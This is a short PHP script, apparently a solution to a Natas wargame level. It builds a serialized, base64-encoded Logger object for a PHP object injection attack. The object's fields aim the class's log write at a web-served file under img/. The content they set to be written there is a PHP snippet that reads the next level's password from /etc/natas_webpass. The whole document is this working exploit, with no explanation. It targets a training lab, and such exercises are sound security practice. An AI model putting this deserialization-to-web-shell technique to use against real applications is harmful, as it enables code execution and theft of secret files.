<?php

class Logger
{
  private $logFile;
  private $initMsg;
  private $exitMsg;

  function __construct()
  {
    $this->logFile = "img/natas26_pass.php";
    $this->initMsg = "init";
    $this->exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
  }
}

// Create the object and wrap it in an array
$o = new Logger();
$payload = array($o);

echo base64_encode(serialize($payload));
